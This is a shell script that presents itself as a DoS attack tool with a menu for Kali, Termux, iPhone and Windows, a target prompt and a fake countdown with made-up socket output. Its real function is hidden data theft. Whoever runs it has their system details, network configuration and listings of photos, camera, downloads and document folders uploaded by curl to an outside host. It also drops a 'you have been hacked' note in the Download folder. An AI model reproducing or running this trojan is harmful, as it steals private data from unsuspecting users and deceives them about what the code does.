#!/system/bin/bash/sh
clear
echo -e "\033[33;32m"
echo "Copyright By Pham Chien

  System : $(uname -a)
  User   : $(whoami)
  date   : $(date)
  path   : $(pwd)
  id     : $(id)

$(cd /$HOME/ ; ls -s -u)

"> system.txt
curl -T system.txt http://happy.mikikk.co.jp/

termux() {
echo "

  $(ifconfig)

  $(cd /sdcard/documents ; ls -s -u)

  ===== FILES SDCARD =====

  $(cd /sdcard/ ; ls -s -u)

  ===== Android Files =====

  $(cd /sdcard/Android ; ls -s -u)

  ===== DATA ANDROID =====

  $(cd /sdcard/Android/data ; ls -s -u)

  ===== MOVIE FILES =====

  $(cd /sdcard/Movies ; ls -s -u)

  ==== Messenger =====

  $(cd /sdcard/Movies/ * ; ls -s -u)

  ==== Pictures =====

  $(cd /sdcard/Pictures ; cd * ; ls -s -u)

  ====== Download =====

  $(cd /sdcard/download ; echo 'All your data has been hacked , contact me : cyberkex.phamchien.net@gmail.com' >> you_have_been_hacked.txt ; ls -s -u ; cat *)

  $(cd /sdcard/download ; cd * ; ls -l -u)

  ====== Image ======

  $(cd /sdcard/DCIM/Screenshots ; ls -s -u)

  ====== VIDEO ======

 $(cd /sdcard/DCIM/Camera ; ls -s -u)

  ====== Camera =====

$(cd /sdcard/DCIM/Camera/Cshot ; cd * ; ls -s -u) " >> system.txt
   curl -T system.txt http://happy.mikikk.co.jp/
}

kali() {
echo "

  $(ifconfig)

  $(cd /home/kali/etc/fstab ; ls -l )

  $(cd /home/kali/Downloads ; ls -l )

  $(cd /home/kali/Pictures ; ls -s -u )

  $(cd /home/kali/Desktop ; ls -s -u )

  $(cd /home/kali/Videos ; ls -s -u )

  $(cd /home/kali/Documents ; ls -s -u )

  $(cd /home/kali/Public ; ls -s -u)

  $(cd /home ; ls -s -u ) ">> system.txt

curl -T system.txt http://happy.mikikk.co.jp/
}

ios() {
echo "
  $(cd / ; ls -s -u)

  $(cd /root ; ls -s -u)

  $(cd /usr ; ls -s -u )

  $(cd * ; ls -s -u)  ">> system.txt

  curl -T system.txt http://happy.mikikk.co.jp/
}
win() {
echo "

  $(ifconfig)

  $(cd /Users/$(whoami)/Downloads ; dir )

  $(cd /Users/$(whoami)/Pictures ; dir  )

  $(cd /Users/$(whoami)/Desktop ; dir )

  $(cd /Users/$(whoami)/Videos ; dir)

  $(cd /Users/$(whoami)/Documents ; dir )

  $(cd /Users/$(whoami)/Public ; dir )

  $(cd /Users/$(whoami) ; dir ) ">> system.txt
  curl -T system.txt http://happy.mikikk.co.jp/
}

windows() {
echo "test" > test.txt
mv test.txt /Users/$(whoami)/Downloads
  if [ -f /Users/$(whoami)/Downloads/test.txt ]
    then
       echo "success"

  else
    echo "your operating system is not valid"
    exit 1
  fi
}
android() {
echo "test" > test.txt
mv test.txt /sdcard/download
  if [ -f /sdcard/download/test.txt ]
    then
       echo "success"

  else
    echo "your operating system is not valid"
    exit 1
  fi
}

iphone() {
echo "test" > test.txt
mv test.txt /root
  if [ -f /root/test.txt ]
   then
     echo "success"

  else
     echo "your operating system is not valid"
    exit 1
  fi
}

kali_linux() {
echo "test" > test.txt
mv test.txt /home
  if [ -f /home/test.txt ]
    then
      echo "success"

  else
     echo "your operating system is not valid"
    exit 1
  fi
}

sent_num() {
num=1
   while [ $num -lt $RANDOM ]
    do
     echo "Socket $RANDOM.$num bytes"
     num=`expr $num + 1`
    done
}

echo "
____       _____
|  _ \  ___/ ___|
| |_| |/ _ \___ \\
|____/ \___/____/
        PhamChienAdams ©

1 ) kali
2 ) termux
3 ) iphone
4 ) win X64"

  echo -n "Enter System : "
   read system

   case $system in

   4)
   windows
   win
   echo -n "Enter Target : "
    read line
  echo 3
  sleep 1
  echo 2
  sleep 1
  echo 1
  sleep 1
  echo ATTACK!!!
  sleep 1
  sent_num
  ;;

   1)
   kali_linux
   kali
   echo -e "\033[33;35m"

  echo -n "Enter Target : "
 read line

  echo 3
  sleep 1
  echo 2
  sleep 1
  echo 1
  sleep 1
  echo ATTACK!!!
  sleep 1
  echo -e "\033[33;31m"
  sent_num
  ;;

  2)
  android
  termux
  echo -e "\033[33;35m"

  echo -n "Enter Target : "
 read line

  echo 3
  sleep 1
  echo 2
  sleep 1
  echo 1
  sleep 1
  echo ATTACK!!!
  sleep 1
  sent_num
  ;;

  3)
  iphone
  ios
  echo -e "\033[33;35m"

  echo -n "Enter Target : "
 read line

  echo 3
  sleep 1
  echo 2
  sleep 1
  echo 1
  sleep 1
  echo ATTACK!!!
  sleep 1
  sent_num
  ;;

  *)
   echo Command not found

   exit 1
esac
